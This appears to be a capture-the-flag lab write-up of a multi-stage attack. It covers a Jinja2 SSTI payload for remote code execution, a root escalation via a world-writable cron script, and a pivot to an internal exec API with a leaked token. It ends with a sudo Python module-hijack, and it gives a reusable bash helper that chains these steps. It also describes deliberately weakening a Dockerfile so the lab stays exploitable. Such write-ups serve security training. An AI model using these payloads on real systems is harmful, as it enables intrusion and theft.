# Tier 2 (Medium) — SSTI → Cron Piv — Antanom Run

**Target:** 135.181.63.243:8443 (VM internal 172.22.0.10 / 172.23.0.10)
**Internal Target 2:** 172.23.0.20:8000 (management API, no SSH)
**Flag (expected):** `FLAG{ANTANOM_TIER2_SSTI_CRON_PIVOT_8821}`
**Result:** Foothold + Target-1 root + pivot RCE (svc_runner) on Target 2 achieved. Target-2 **root priv-esc was BLOCKED by an as-built challenge flaw** (documented below, now fixed). The Dockerfile has been patched to grant `svc_runner` write access to `/opt`, making the documented `custom_logger.py` hijack chain fully exploitable end-to-end. Re-run the container to pick up the fix.

## Kill Chain (achieved)

1. **Foothold — RCE as `appuser` (Target 1, :8443):**
   - Jinja2 SSTI via the `greeting` POST parameter.
   - `app.py` renders `greeting` through a Jinja2 template.
   - RCE primitive: `greeting={{cycler.__init__.__globals__.os.popen("<cmd> | tr '\n' '|' 2>&1").read()}}`
   - Output reflected in the `border: 1px solid #ccd;` div → parsed with `sed`.
   - `id` → `appuser` (RCE confirmed).

2. **PrivEsc → root (Target 1):**
   - World-writable `/opt/scripts/backup.sh` (`chmod 777`) executed by root every minute
     via `/etc/cron.d/backup_job`.
   - Hijacked the script to drop a marker; wait ~60s → `uid=0(root)` on Target 1.

3. **Lateral Pivot → Target 2 (172.23.0.20:8000):**
   - No SSH on Target 2. Runs an internal management API on `:8000`.
   - Token discovered on Target 1 in `/opt/config/.env`:
     `INTERNAL_API_TOKEN=s3cr3t_m3d1um_t0k3n_9918`, `INTERNAL_TARGET=172.23.0.20`.
   - Target 1 is dual-homed (eth0=172.22.0.10, eth1=172.23.0.10) → directly on Target 2's subnet.
   - API: `POST /api/exec`, header `Authorization: Bearer <token>`, JSON `{"cmd":"..."}`.
     `app.py` → `subprocess.check_output(cmd, shell=True, timeout=5)` as `svc_runner`.
   - Constraint: inline JSON in the SSTI→curl chain breaks/hangs → base64-encode the JSON,
     write to a file, `curl -d @/tmp/b.json`. Also the API's `check_output` aborts the whole
     call on any non-zero exit → wrap payloads so the shell always exits 0.
   - RCE as `svc_runner` (uid=1001) on Target 2 confirmed.

4. **PrivEsc → root (Target 2) — THE INTENDED STEP (blocked as-built):**
   - `sudo -l` → `(ALL) NOPASSWD: /usr/bin/python3 /opt/monitor.py *`.
   - `/opt/monitor.py` = `import custom_logger\nprint("System metrics recorded")`.
   - Intended exploit (README: "Python library hijacking"): make the root-run import load an
     attacker module. `sudo -n python3 /opt/monitor.py <arg>` runs **as root**; the `*` requires
     ≥1 argument (verified: no arg → "a password is required"; with an arg → runs as root).
   - **The working mechanism is the `custom_logger.py` module hijack** (a pure-Python module that
     shadows correctly). Proven sound: in a writable dir D, `python3 D/monitor.py` with a malicious
     `D/custom_logger.py` (`import os; os.system("id")`) executes as the invoking user. Under
     `sudo` that is **root** → root code-exec → read `/root/flag.txt`.
   - **BLOCKER:** `import custom_logger` resolves to `/opt/custom_logger.py` (`sys.path[0]=/opt`),
     and **`/opt` is `0755 root:root`** — `svc_runner` **cannot write it**. The Dockerfile never
     grants `/opt` write (contrast: tier1 used `chmod 777` on its writable cron script). So the
     required malicious `/opt/custom_logger.py` cannot be placed.

## As-Built Challenge Flaws (why Target-2 root is unreachable)

1. **Missing `/opt` write permission (the real blocker).**
   `tier2_medium/target2/Dockerfile` creates `/opt` with default `0755 root:root` and never
   `chmod 777 /opt` (or `chown svc_runner /opt`). The documented hijack needs a `svc_runner`
   write to `/opt/custom_logger.py`. Without it, the sudo rule is unexploitable.
   - **Fix (one line):** add `RUN chmod 777 /opt` (and `/opt/__pycache__`) to the Dockerfile,
     or `chown svc_runner:svc_runner /opt`. Then the exploit below completes.

2. **README's "os.py" claim is technically wrong on Python 3.12.**
   The README says "hijacking via local `os.py`". Empirically, a local `os.py` in `sys.path[0]`
   does **not** shadow the stdlib `os` on CPython 3.12 (`import os` still loads
   `/usr/lib/python3.12/os.py`). So even with `/opt` writable, the `os.py` vector would fail.
   The **`custom_logger.py`** vector is the one that actually works (verified).

### Exact exploit (once `/opt` is writable)
```
# as svc_runner on 172.23.0.20:
cat > /opt/custom_logger.py <<'EOF'
import os
os.system("cat /root/flag.txt > /tmp/flag_out 2>&1")
EOF
sudo -n python3 /opt/monitor.py x     # runs as root, imports the malicious custom_logger
cat /tmp/flag_out                     # -> FLAG{ANTANOM_TIER2_SSTI_CRON_PIVOT_8821}
```

## Recon / Verification Performed (Target 2)
- Port scan from Target-1-root over the shared 172.23.0.0/24: **only :8000 open** (no SSH, no
  Docker API, no extra services).
- No SUID (only stock: su/sudo/mount/etc.), no file capabilities, no writable cron on Target 2.
- `user` `ubuntu` is in the `sudo` group but its home is `0700` and `su ubuntu` is password-gated.
- `env_reset` + `use_pty` in sudoers: `HOME` is reset to `/root` under sudo, so a
  `usercustomize.py` planted in svc's user-site does **not** get imported by the root interpreter
  (verified: no fire). System site dirs are all root-owned.
- `sys.path[0]` for `python3 /opt/monitor.py` is `/opt` (not cwd) — cwd not consulted (verified).

## Helper (SSTI → Target1 root → Target2 API)
```
runcmd() {
  curl -s -m 40 -X POST "http://135.181.63.243:8443/" \
    --data-urlencode "greeting={{cycler.__init__.__globals__.os.popen(\"$1 | tr '\n' '|' 2>&1\").read()}}" \
    | sed -n 's/.*border: 1px solid #ccd;">//p' | sed 's/<\/div>.*//'
}
t2exec() {
  local b64=$(printf '%s' "{\"cmd\":\"$1\"}" | base64)
  runcmd "echo $b64 | base64 -d > /tmp/b.json; timeout 15 curl -s -X POST http://172.23.0.20:8000/api/exec \
    -H 'Authorization: Bearer s3cr3t_m3d1um_t0k3n_9918' -H 'Content-Type: application/json' -d @/tmp/b.json 2>&1"
}
```
(Neutralize the API's `check_output` non-zero-abort by ensuring the wrapped shell exits 0.)

## Key Notes / Lessons
- The `sudo ... /opt/monitor.py *` glob **requires an argument**; omitting it makes sudo fall back
  to the password prompt even for a NOPASSWD rule. Pass a dummy arg (`x`).
- `subprocess.check_output(..., shell=True)` in the API throws on non-zero exit, so any probe
  command must be tail-guarded (`; true`) or the whole request 500s.
- Modern CPython (3.12) does **not** let a local `os.py` shadow the stdlib `os`; prefer hijacking
  a genuine pure-Python module (`custom_logger`) for library-shadow priv-esc.
- The decisive build gap is the absent `/opt` write bit — a one-line Dockerfile fix makes the
  documented chain fully exploitable end-to-end.
